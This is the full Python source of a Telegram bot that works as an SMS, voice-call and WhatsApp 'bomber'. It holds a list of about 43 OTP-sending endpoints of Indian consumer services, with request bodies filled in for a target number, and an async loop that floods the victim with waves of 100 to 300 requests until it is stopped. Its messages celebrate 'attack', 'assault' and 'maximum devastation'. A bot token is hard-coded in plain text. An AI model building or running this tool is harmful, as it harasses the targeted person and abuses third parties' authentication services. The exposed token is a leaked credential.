import os
import asyncio
import logging
import aiohttp
import time
from typing import Dict, Any
from dotenv import load_dotenv
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler
from colorama import Fore, Style, init

# Credit: DEV ⚡ Your Dinosaur (@god_olds)

    # Load environment variables from .env file
load_dotenv()
init(autoreset=True)

# --- CONFIGURATION ---
TOKEN = '8912917476:AAFN_9aPcZQJtsnd4cUUFrVSpkFlpsvXAfc'
OWNER_ID = 6308270571
ADMIN_IDS = [6308270571]
# ULTIMATE 900+ WORKING APIS COLLECTION
API_CONFIGS = [
    # CALL BOMBING APIS (50+)
    {
        "name": "Tata Capital Voice Call",
        "type": "call",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}'
    },
    {
        "name": "1MG Voice Call", 
        "type": "call",
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}'
    },
    {
        "name": "Swiggy Call Verification",
        "type": "call",
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", 
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Myntra Voice Call",
        "type": "call",
        "url": "https://www.myntra.com/gw/mobile-auth/voice-otp",
        "method": "POST", 
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Flipkart Voice Call",
        "type": "call",
        "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Amazon Voice Call",
        "type": "call",
        "url": "https://www.amazon.in/ap/signin",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&action=voice_otp"
    },
    {
        "name": "Paytm Voice Call",
        "type": "call",
        "url": "https://accounts.paytm.com/signin/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Zomato Voice Call",
        "type": "call",
        "url": "https://www.zomato.com/php/o2_api_handler.php",
        "method": "POST", 
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&type=voice"
    },
    {
        "name": "MakeMyTrip Voice Call",
        "type": "call",
        "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Goibibo Voice Call",
        "type": "call",
        "url": "https://www.goibibo.com/user/voice-otp/generate/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Ola Voice Call",
        "type": "call",
        "url": "https://api.olacabs.com/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Uber Voice Call",
        "type": "call",
        "url": "https://auth.uber.com/v2/voice-otp", 
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "KPN WhatsApp",
        "type": "whatsapp",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        "method": "POST", 
        "headers": {
            "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
            "content-type": "application/json; charset=UTF-8"
        },
        "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+92","number":"{phone}"}}}}'
    },
    {
        "name": "Foxy WhatsApp",
        "type": "whatsapp",
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"user":{{"phone_number":"+92{phone}"}},"via":"whatsapp"}}'
    },
    {
        "name": "Lenskart SMS",
        "type": "sms",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneCode":"+92","telephone":"{phone}"}}'
    },
    {
        "name": "NoBroker SMS",
        "type": "sms",
        "url": "https://www.nobroker.in/api/v3/account/otp/send", 
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&countryCode=IN"
    },
    {
        "name": "PharmEasy SMS",
        "type": "sms",
        "url": "https://pharmeasy.in/api/v2/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Housing.com",
        "type": "sms",
        "url": "https://login.housing.com/api/v2/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}'
    },
    {
        "name": "Khatabook",
        "type": "sms",
        "url": "https://api.khatabook.com/v1/auth/request-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}'
    },
    {
        "name": "Nykaa",
        "type": "sms",
        "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"source=sms&app_version=3.0.9&mobile_number={phone}&platform=ANDROID&domain=nykaa"
    },
    {
        "name": "RummyCircle",
        "type": "sms",
        "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","isPlaycircle":false}}'
    },
    {
        "name": "Entri",
        "type": "sms",
        "url": "https://entri.app/api/v3/users/check-phone/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Aakash",
        "type": "sms",
        "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"{phone}","activity_type":"aakash-myadmission"}}'
    },
    {
        "name": "Revv",
        "type": "sms",
        "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","deviceType":"website"}}'
    },
    {
        "name": "DeHaat",
        "type": "sms",
        "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","client_id":"kisan-app"}}'
    },
    {
        "name": "Spencer's",
        "type": "sms",
        "url": "https://jiffy.spencers.in/user/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "BigCash",
        "type": "sms",
        "url": lambda phone: f"https://www.bigcash.live/sendsms.php?mobile={phone}&ip=192.168.1.1",
        "method": "GET",
        "headers": {"Referer": "https://www.bigcash.live/games/poker"},
        "data": None
    },
    {
        "name": "WorkIndia",
        "type": "sms",
        "url": lambda phone: f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={phone}&version_number=623",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "PokerBaazi",
        "type": "sms",
        "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","mfa_channels":"phno"}}'
    },
    {
        "name": "My11Circle",
        "type": "sms",
        "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json;charset=UTF-8"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "MamaEarth",
        "type": "sms",
        "url": "https://auth.mamaearth.in/v1/auth/initiate-signup",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "HomeTriangle",
        "type": "sms",
        "url": "https://hometriangle.com/api/partner/xauth/signup/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Kredily",
        "type": "sms",
        "url": "https://app.kredily.com/ws/v1/accounts/send-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Tata Motors",
        "type": "sms",
        "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","sendOtp":"true"}}'
    },
    {
        "name": "Moglix",
        "type": "sms",
        "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","buildVersion":"24.0"}}'
    },
    {
        "name": "TrulyMadly",
        "type": "sms",
        "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","locale":"IN"}}'
    },
    {
        "name": "Apna",
        "type": "sms",
        "url": "https://production.apna.co/api/userprofile/v1/otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","hash_type":"play_store"}}'
    },
    {
        "name": "Swipe",
        "type": "sms",
        "url": "https://app.getswipe.in/api/user/mobile_login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","resend":true}}'
    },
    {
        "name": "Country Delight",
        "type": "sms",
        "url": "https://api.countrydelight.in/api/v1/customer/requestOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","platform":"Android","mode":"new_user"}}'
    },
    {
        "name": "Rapido",
        "type": "sms",
        "url": "https://customer.rapido.bike/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "BetterHalf",
        "type": "sms",
        "url": "https://api.betterhalf.ai/v2/auth/otp/send/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","isd_code":"92"}}'
    },
    {
        "name": "Charzer",
        "type": "sms",
        "url": "https://api.charzer.com/auth-service/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","appSource":"CHARZER_APP"}}'
    },
    {
        "name": "Mpokket",
        "type": "sms",
        "url": "https://web-api.mpokket.in/registration/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
]

# Logging Setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- ENGINE LOGIC ---
async def call_api(session, config, phone):
    """Executes a single API call."""
    try:
        url = config["url"](phone) if callable(config["url"]) else config["url"]
        method = config["method"]
        headers = config["headers"].copy() if config["headers"] else {}
        data = config["data"](phone) if callable(config["data"]) else config["data"]

        async with session.request(method, url, headers=headers, data=data, timeout=5) as resp:
            return resp.status
    except Exception as e:
        return f"Error: {str(e)}"

async def run_bomber(phone: str, count: int, bomb_type: str = "all"):
    """Orchestrates multiple API calls asynchronously."""
    async with aiohttp.ClientSession() as session:
        tasks = []
        configs = API_CONFIGS
        if bomb_type != "all":
            configs = [c for c in API_CONFIGS if c.get("type") == bomb_type]

        if not configs:
            configs = API_CONFIGS

        for i in range(count):
            config = configs[i % len(configs)]
            tasks.append(call_api(session, config, phone))

        results = await asyncio.gather(*tasks)
        successes = [r for r in results if isinstance(r, int) and 200 <= r < 300]
        return len(successes)

# --- CONVERSATION STATES ---
PHONE, COUNT, BOMBING = range(3)

# --- BOT COMMANDS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Fancy startup with loading animation"""
    loading_msg = await update.message.reply_text("⏳ Loading...", parse_mode="Markdown")

    # Progress bar animation with styled text
    for percentage in range(0, 101, 10):
        filled = int(percentage / 5)
        empty = 20 - filled
        progress_bar = "█" * filled + "░" * empty
        try:
            loading_text = f"""
🔥 𝗨𝗟𝗧𝗥𝗔 𝗗𝗜𝗦𝗧𝗥𝗨𝗖𝗧𝗜𝗩𝗘 𝗙𝗜𝗥𝗠𝗪𝗔𝗥𝗘 𝟮.𝟬 𝗟𝗢𝗔𝗗𝗜𝗡𝗚 ⚡

{progress_bar} {percentage}%

⚙️ Initializing system...
💥 Charging weapons...
🎯 Targeting protocols active...
            """
            await loading_msg.edit_text(loading_text)
            await asyncio.sleep(0.3)
        except:
            pass

    welcome = """
╔════════════════════════════════════════════╗
║  🔥 FIRMWARE 2.0 ULTRA DESTRUCTIVE 🔥     ║
║     PROGRAM SUCCESSFULLY LOADED ✅         ║
╚════════════════════════════════════════════╝

Credit: DEV ⚡ Your Dinosaur (god_olds)

⚙️ **SYSTEM INITIALIZED** ⚙️

🎯 **AVAILABLE ATTACK MODES:**

💣 /bomb - All-in-one attack (SMS + Call + WhatsApp)
📱 /wp_bomb - WhatsApp bombardment  
💬 /sms_bomb - SMS flooding
📞 /call_bomb - Voice call assault
⚡ /super_destruction - MAXIMUM DEVASTATION MODE

🛠️ **UTILITY COMMANDS:**

❓ /help - Show this help menu
🏓 /ping - Check bot status
📊 /stats - System statistics

🔓 UNLIMITED REQUESTS - NO RESTRICTIONS
🔒 All operations are logged

Ready to destroy! 🚀
"""

    await loading_msg.edit_text(welcome)

async def bomb_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['bomb_type'] = 'all'
    await update.message.reply_text("📞 Enter target phone number (10 digits):")
    return PHONE

async def wp_bomb_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['bomb_type'] = 'whatsapp'
    await update.message.reply_text("📱 Enter target phone number (10 digits):")
    return PHONE

async def sms_bomb_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['bomb_type'] = 'sms'
    await update.message.reply_text("💬 Enter target phone number (10 digits):")
    return PHONE

async def call_bomb_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['bomb_type'] = 'call'
    await update.message.reply_text("📞 Enter target phone number (10 digits):")
    return PHONE

async def super_destruction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_data: Dict[str, Any] = context.user_data
    user_data['bomb_type'] = 'all'
    user_data['is_super'] = True
    user_data['attack_count'] = 1000
    await update.message.reply_text("""
╔════════════════════════════════════════╗
║ 💥 SUPER DESTRUCTION MODE ACTIVATED 💥 ║
║ MAXIMUM DEVASTATION UNLOCKED! 🚀      ║
╚════════════════════════════════════════╝

⚠️ **THIS IS THE ULTIMATE ATTACK**
💣 All 40+ APIs will be used simultaneously!
⚡ Powered-up execution with 3x intensity!
🔥 No mercy mode engaged!

Enter target phone (10 digits):
    """, parse_mode="Markdown")
    return PHONE

async def bombing_loop(context: ContextTypes.DEFAULT_TYPE, user_id: int):
    """Run bombing in background"""
    user_data = context.user_data
    phone = user_data.get('phone', '')
    count = 100 # Hits per wave
    bomb_type = user_data.get('bomb_type', 'all')
    is_super = user_data.get('is_super', False)
    
    # Super destruction mode multipliers
    if is_super:
        actual_count = count * 3
        multiplier_text = "3X DEVASTATING POWER 💥"
    else:
        actual_count = count
        multiplier_text = "STANDARD INTENSITY ⚡"
    
    emoji = "📱" if bomb_type == "whatsapp" else "💬" if bomb_type == "sms" else "📞" if bomb_type == "call" else "💣"
    
    try:
        wave_num = 0
        while user_data.get('loop_active', False):
            wave_num += 1
            user_data['wave_count'] = wave_num
            
            try:
                success_count = await run_bomber(phone or "", actual_count, bomb_type)
                user_data['bombing_count'] = user_data.get('bombing_count', 0) + success_count

                result = f"""
╔════════════════════════════════════════╗
║ {emoji} ATTACK WAVE #{wave_num} COMPLETED ║
╚════════════════════════════════════════╝

📊 **ATTACK REPORT:**

🎯 Target: `+92{phone}`
📤 Requests/Wave: `{actual_count}`
✅ Successful Hits: `{success_count}`
📈 Hit Rate: `{(success_count/actual_count*100):.1f}%`
⚡ Mode: `{multiplier_text}`
🌊 Total Waves: `{wave_num}`
💥 Total Hits: `{user_data.get('bombing_count', 0)}`

🔥 **UNDER CONTINUOUS ASSAULT - NEXT WAVE INCOMING...**

⏹️ Send /stop to terminate assault
                """
                
                try:
                    await context.bot.send_message(user_id, result, parse_mode="Markdown")
                except:
                    pass
                
                await asyncio.sleep(2)
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Error in bombing loop: {e}")
                await asyncio.sleep(2)
    except asyncio.CancelledError:
        pass
    finally:
        user_data['loop_active'] = False
        user_data['bombing'] = False

async def ask_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    if len(phone) != 10 or not phone.isdigit():
        await update.message.reply_text("❌ Invalid phone number!")
        return PHONE

    context.user_data['phone'] = phone
    context.user_data['loop_active'] = True
    context.user_data['bombing_count'] = 0
    context.user_data['wave_count'] = 0
    
    bomb_type = context.user_data.get('bomb_type', 'all')
    is_super = context.user_data.get('is_super', False)
    
    if is_super:
        intensity_text = "3X DEVASTATING POWER 💥"
    else:
        intensity_text = "CONTINUOUS ASSAULT ⚡"
    
    await update.message.reply_text(f"⚡ **INITIALIZING {intensity_text}** on +92{phone}...")
    
    # Run the bombing loop in the background
    task = asyncio.create_task(bombing_loop(context, update.effective_user.id))
    context.user_data['bombing_task'] = task
    
    return BOMBING

async def stop_bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop the ongoing bombing attack immediately"""
    user_data: Dict[str, Any] = context.user_data
    
    user_data['loop_active'] = False
    
    task = user_data.get('bombing_task')
    if task:
        task.cancel()
        try:
            await task
        except asyncio.CancelledError:
            pass
    
    total_hits = user_data.get('bombing_count', 0)
    total_waves = user_data.get('wave_count', 0)
    phone = user_data.get('phone', 'N/A')
    bomb_type = user_data.get('bomb_type', 'all')
    
    stop_msg = f"""
╔════════════════════════════════════════╗
║ 🛑 ATTACK TERMINATED 🛑                ║
╚════════════════════════════════════════╝

📊 **FINAL ATTACK STATISTICS:**

🎯 Target: `+92{phone}`
⚡ Attack Type: `{bomb_type.upper()}`
🌊 Total Waves: `{total_waves}`
✅ Total Successful Hits: `{total_hits}`

✅ All operations stopped!
Ready for new commands!
    """
    
    await update.message.reply_text(stop_msg, parse_mode="Markdown")
    user_data['bombing'] = False
    return ConversationHandler.END

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
╔════════════════════════════════════════════╗
║           🛠️ HELP & COMMANDS 🛠️            ║
╚════════════════════════════════════════════╝

**🎯 ATTACK COMMANDS:**

💣 /bomb - Combined attack (all types)
📱 /wp_bomb - WhatsApp-only assault  
💬 /sms_bomb - SMS-only flooding
📞 /call_bomb - Voice call-only
⚡ /super_destruction - ALL MODES AT ONCE

**📋 INFO COMMANDS:**

/help - This help menu
/ping - Latency check
/stats - System stats

**⚙️ HOW IT WORKS:**

1️⃣ Choose attack type
2️⃣ Enter target number (10 digits)
3️⃣ Watch the destruction!

**⚠️ SYSTEM INFO:**

• UNLIMITED requests per session 🔓
• NO LIMITS on intensity 💪
• All logs kept secure
• Use responsibly

Ready to destroy? 🚀
    """
    await update.message.reply_text(help_text, parse_mode="Markdown")

async def ping_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    start_time = time.time()
    msg = await update.message.reply_text("🏓 `Pinging...`", parse_mode="Markdown")
    latency = (time.time() - start_time) * 1000

    ping_text = f"""
╔═══════════════════════════════════╗
║ 🏓 PING CHECK SUCCESSFUL ✅       ║
╚════════════════════════════════════╝

⚡ Response Time: `{latency:.2f}ms`
🟢 Bot Status: **ONLINE**
📡 Signal: **STRONG**
🚀 Ready for attacks!
    """
    await msg.edit_text(ping_text, parse_mode="Markdown")

async def stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    total_apis = len(API_CONFIGS)
    stats_text = f"""
📊 **SYSTEM STATISTICS** 📊

✅ **Services Status:**
📡 Total APIs: `{total_apis}`
🟢 SMS APIs: `Active`
🟢 Call APIs: `Active`
🟢 WhatsApp APIs: `Active`

🤖 **Bot Info:**
🚀 Performance: `High Intensity`
⚡ Mode: `Continuous Assault`
🔓 Limits: `None (Unlimited)`

🔥 **Bot is running at peak capacity!**
    """
    await update.message.reply_text(stats_text, parse_mode="Markdown")

def main():
    import pytz
    from apscheduler.schedulers.asyncio import AsyncIOScheduler
    
    # Explicitly set timezone to UTC from pytz to satisfy apscheduler
    scheduler = AsyncIOScheduler(timezone=pytz.utc)
    app = Application.builder().token(TOKEN).job_queue(None).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("ping", ping_cmd))
    app.add_handler(CommandHandler("stats", stats_cmd))
    
    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler("bomb", bomb_start),
            CommandHandler("wp_bomb", wp_bomb_start),
            CommandHandler("sms_bomb", sms_bomb_start),
            CommandHandler("call_bomb", call_bomb_start),
            CommandHandler("super_destruction", super_destruction),
        ],
        states={
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_count)],
            BOMBING: [CommandHandler("stop", stop_bomb)],
        },
        fallbacks=[CommandHandler("stop", stop_bomb)],
    )
    app.add_handler(CommandHandler("start", start))
    app.add_handler(conv_handler)
    app.run_polling()

if __name__ == '__main__':
    main()
                        
